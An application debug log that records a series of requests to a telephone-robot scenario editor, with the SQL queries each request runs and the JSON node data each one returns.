---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/getfnodeinfo
[ info ] s-6-2111.pssdss.com/user/scenarios/getfnodeinfo [运行时间：0.054282s][吞吐率：18.42req/s] [内存消耗：4,637.22kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'getfnodeinfo',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '9',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'fId' => '12064',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->getFnodeInfo[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000298s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000628s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.008621s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000699s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000161s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000444s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000122s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000446s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000247s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000410s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000124s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000380s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000149s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000240s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_node` [ RunTime:0.001852s ]
[ sql ] [ SQL ] SELECT `name`,`break`,`action`,`action_id`,`flow_label`,`pause_time`,`no_speak_knowledge_id`,`sms_template_id`,`bridge` FROM `rk_tel_flow_node` WHERE  `id` = 12064 LIMIT 1 [ RunTime:0.000151s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_corpus` [ RunTime:0.000401s ]
[ sql ] [ SQL ] SELECT `id`,`content` FROM `rk_tel_corpus` WHERE  `src_id` = 12064  AND `src_type` = 0 LIMIT 1 [ RunTime:0.004508s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_branch` [ RunTime:0.000409s ]
[ sql ] [ SQL ] SELECT * FROM `rk_tel_flow_branch` WHERE  `flow_id` = 12064 ORDER BY id asc [ RunTime:0.000150s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/getfnodeinfo
[ log ] code=0#msg=获取数据成功#data={"name":"\u95ee\u5019","break":1,"action":0,"action_id":0,"flow_label":"\u95ee\u5019","pause_time":5000,"no_speak_knowledge_id":0,"sms_template_id":0,"bridge":0,"content":"\u60a8\u597d","tc_id":17804,"returns":[{"id":22484,"flow_id":12064,"name":"\u80af\u5b9a","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":2},{"id":22485,"flow_id":12064,"name":"\u5426\u5b9a","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":3},{"id":22486,"flow_id":12064,"name":"\u62d2\u7edd","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":4},{"id":22487,"flow_id":12064,"name":"\u4e2d\u6027","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":5},{"id":22488,"flow_id":12064,"name":"\u672a\u8bc6\u522b","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":6}]}
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/getsmstpl
[ info ] s-6-2111.pssdss.com/user/scenarios/getsmstpl [运行时间：0.052667s][吞吐率：18.99req/s] [内存消耗：4,613.16kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'getsmstpl',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '11',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'sceneId' => '561',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->getSmsTpl[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000345s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000622s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000592s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000142s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000414s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000122s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000434s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000229s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000424s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000120s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000130s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000254s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_sms_template` [ RunTime:0.000448s ]
[ sql ] [ SQL ] SELECT `id`,`name` FROM `rk_sms_template` WHERE  `status` = 1 [ RunTime:0.000129s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/getsmstpl
[ log ] code=1#msg=获取数据失败#data=[]
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/getfnodeinfo
[ info ] s-6-2111.pssdss.com/user/scenarios/getfnodeinfo [运行时间：0.053762s][吞吐率：18.60req/s] [内存消耗：4,636.89kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'getfnodeinfo',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '9',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'fId' => '12064',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->getFnodeInfo[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000300s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000634s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000181s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000577s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000185s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000423s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000530s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000469s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000234s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000408s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000142s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.004132s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000153s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.001045s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_node` [ RunTime:0.009488s ]
[ sql ] [ SQL ] SELECT `name`,`break`,`action`,`action_id`,`flow_label`,`pause_time`,`no_speak_knowledge_id`,`sms_template_id`,`bridge` FROM `rk_tel_flow_node` WHERE  `id` = 12064 LIMIT 1 [ RunTime:0.000180s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_corpus` [ RunTime:0.000397s ]
[ sql ] [ SQL ] SELECT `id`,`content` FROM `rk_tel_corpus` WHERE  `src_id` = 12064  AND `src_type` = 0 LIMIT 1 [ RunTime:0.000152s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_branch` [ RunTime:0.000394s ]
[ sql ] [ SQL ] SELECT * FROM `rk_tel_flow_branch` WHERE  `flow_id` = 12064 ORDER BY id asc [ RunTime:0.000133s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/getfnodeinfo
[ log ] code=0#msg=获取数据成功#data={"name":"\u95ee\u5019","break":1,"action":0,"action_id":0,"flow_label":"\u95ee\u5019","pause_time":5000,"no_speak_knowledge_id":0,"sms_template_id":0,"bridge":0,"content":"\u60a8\u597d","tc_id":17804,"returns":[{"id":22484,"flow_id":12064,"name":"\u80af\u5b9a","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":2},{"id":22485,"flow_id":12064,"name":"\u5426\u5b9a","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":3},{"id":22486,"flow_id":12064,"name":"\u62d2\u7edd","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":4},{"id":22487,"flow_id":12064,"name":"\u4e2d\u6027","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":5},{"id":22488,"flow_id":12064,"name":"\u672a\u8bc6\u522b","keyword":"","keyword_py":null,"next_flow_id":null,"is_select":1,"type":6}]}
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/getsflowinfo
[ info ] s-6-2111.pssdss.com/user/scenarios/getsflowinfo [运行时间：0.047690s][吞吐率：20.97req/s] [内存消耗：4,623.41kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'getsflowinfo',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '8',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'id' => '12064',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->getsflowInfo[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000315s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000622s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000169s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000605s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000410s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000123s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000426s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000254s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000449s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000126s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000401s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000131s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000255s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_node` [ RunTime:0.000501s ]
[ sql ] [ SQL ] SELECT `name` FROM `rk_tel_flow_node` WHERE  `id` = 12064 LIMIT 1 [ RunTime:0.000118s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_corpus` [ RunTime:0.000402s ]
[ sql ] [ SQL ] SELECT `id`,`content`,`audio` FROM `rk_tel_corpus` WHERE  `src_id` = 12064  AND `src_type` = 0 LIMIT 1 [ RunTime:0.000127s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/getsflowinfo
[ log ] code=0#msg=success#data={"id":17804,"content":"\u60a8\u597d","audio":null,"name":"\u95ee\u5019","isVar":0}
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/getsflowinfo
[ info ] s-6-2111.pssdss.com/user/scenarios/getsflowinfo [运行时间：0.050348s][吞吐率：19.86req/s] [内存消耗：4,623.41kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'getsflowinfo',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '8',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'id' => '12064',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->getsflowInfo[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000303s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000632s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000163s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000646s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000153s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000434s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000127s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000442s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000241s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.011652s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000190s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000439s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000164s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000271s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_flow_node` [ RunTime:0.000508s ]
[ sql ] [ SQL ] SELECT `name` FROM `rk_tel_flow_node` WHERE  `id` = 12064 LIMIT 1 [ RunTime:0.000119s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_corpus` [ RunTime:0.000444s ]
[ sql ] [ SQL ] SELECT `id`,`content`,`audio` FROM `rk_tel_corpus` WHERE  `src_id` = 12064  AND `src_type` = 0 LIMIT 1 [ RunTime:0.000130s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/getsflowinfo
[ log ] code=0#msg=success#data={"id":17804,"content":"\u60a8\u597d","audio":null,"name":"\u95ee\u5019","isVar":0}
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/defaultmt
[ info ] s-6-2111.pssdss.com/user/scenarios/defaultmt [运行时间：0.047340s][吞吐率：21.12req/s] [内存消耗：4,632.73kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'defaultmt',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '26',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'sceneId' => '561',
  'processId' => '3119',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->defaultMt[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000323s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000611s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000163s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000606s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000137s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000426s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000119s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000456s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000384s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000406s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000140s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000382s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000133s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000241s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_knowledge` [ RunTime:0.000526s ]
